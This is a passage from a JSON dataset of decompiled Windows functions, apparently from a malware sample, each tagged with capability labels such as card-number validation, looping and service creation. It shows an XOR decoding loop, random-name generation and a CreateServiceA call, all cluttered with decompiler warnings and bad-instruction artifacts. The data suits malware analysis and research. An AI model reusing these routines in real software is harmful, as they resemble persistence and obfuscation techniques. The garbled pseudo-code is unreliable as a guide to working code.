        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040476e) overlaps instruction at (ram,0x0040476d)\n// \n\nint32_t __cdecl fcn.00404750(int32_t arg_8h, uint8_t *arg_ch)\n\n{\n    char cVar1;\n    uint8_t in_AL;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_ESI;\n    uint8_t *puVar4;\n    uint8_t *unaff_EDI;\n    bool in_CF;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    \n    if ((in_CF) || (!in_CF)) {\n        unaff_ESI = 0;\n        unaff_EDI = arg_ch;\n    }\n    cVar1 = in_AL - *unaff_EDI;\n    puVar4 = unaff_ESI + -1;\n    iVar2 = func_0x1018a6e0((in_NT & 1) * 0x4000 | SBORROW1(in_AL, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                            (in_TF & 1) * 0x100 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                            ((POPCOUNT(cVar1) & 1U) == 0) * 4 | in_AL < *unaff_EDI | (in_ID & 1) * 0x200000 |\n                            (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000);\n    if (unaff_EDI != 0xffffffff) {\n        do {\n            iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n            iVar2 = iVar3 / 0x1a;\n            puVar4[arg_8h] = iVar3 % 0x1a + 0x61;\n            puVar4 = puVar4 + 1;\n        } while (puVar4 < unaff_EDI + 1);\n    }\n    return iVar2;\n}\n",
        "token_count": 547
    },
    "00404c00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404c1e) overlaps instruction at (ram,0x00404c1d)\n// \n\nint32_t __fastcall fcn.00404c00(uint param_1, ushort param_2)\n\n{\n    uint uVar1;\n    char *in_EAX;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint *unaff_EDI;\n    bool in_ZF;\n    \n    if (!in_ZF) {\n        if (in_ZF) {\n            uVar1 = in(param_2);\n            *unaff_EDI = uVar1;\n            if (*0x10 < 1) {\n                in_EAX[2] = in_EAX[2] + (param_1 >> 8);\n                *in_EAX = *in_EAX + in_EAX;\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            uVar2 = in_EAX ^ 0xdee0ed6d;\n            pcVar3 = sym.imp.MSVCRT.dll_rand + (uVar2 & 0xffff0000 | uVar2 + (uVar2 >> 8) * -0x31);\n            goto code_r0x00404c24;\n        }\n    }\n    pcVar3 = (*_sym.imp.MSVCRT.dll_rand)();\ncode_r0x00404c24:\n    return pcVar3 % 5 + 3;\n}\n",
        "token_count": 330
    },
    "00404b80": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404bc3) overlaps instruction at (ram,0x00404bba)\n// \n// WARNING: Removing unreachable block (ram,0x00404bdb)\n\nvoid __cdecl fcn.00404b80(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    int32_t in_EDX;\n    uint32_t unaff_EBX;\n    int32_t *piVar3;\n    bool bVar4;\n    \n    uVar2 = 0;\n    if (arg_14h != 0) {\n        do {\n            bVar4 = in_EDX < 0x51;\n            uVar1 = *(uVar2 + arg_10h);\n            unaff_EBX = unaff_EBX & 0xffffff00;\n            piVar3 = unaff_EBX | uVar1;\n            if ((bVar4) || (!bVar4)) {\n                bVar4 = false;\n                in_EDX = 0;\n                in_EAX = uVar2;\n            }\n            *(arg_10h + 0x43d1773a) = *(arg_10h + 0x43d1773a) ^ 0x8b27e95e;\n            *piVar3 = *piVar3 << 0x12;\n            in_EDX = CONCAT44(in_EDX, in_EAX + 0x7c8ecb0d + !bVar4) % arg_ch;\n            *(uVar2 + arg_10h) = uVar1 ^ *(in_EDX + arg_8h);\n            uVar2 = uVar2 + 1;\n            in_EAX = arg_8h;\n        } while (uVar2 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 437
    },
    "004045b0": {
        "rules": [
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nuint __cdecl fcn.004045b0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    bool in_OF;\n    \n    if ((!in_OF) && (in_OF)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 187
    }
}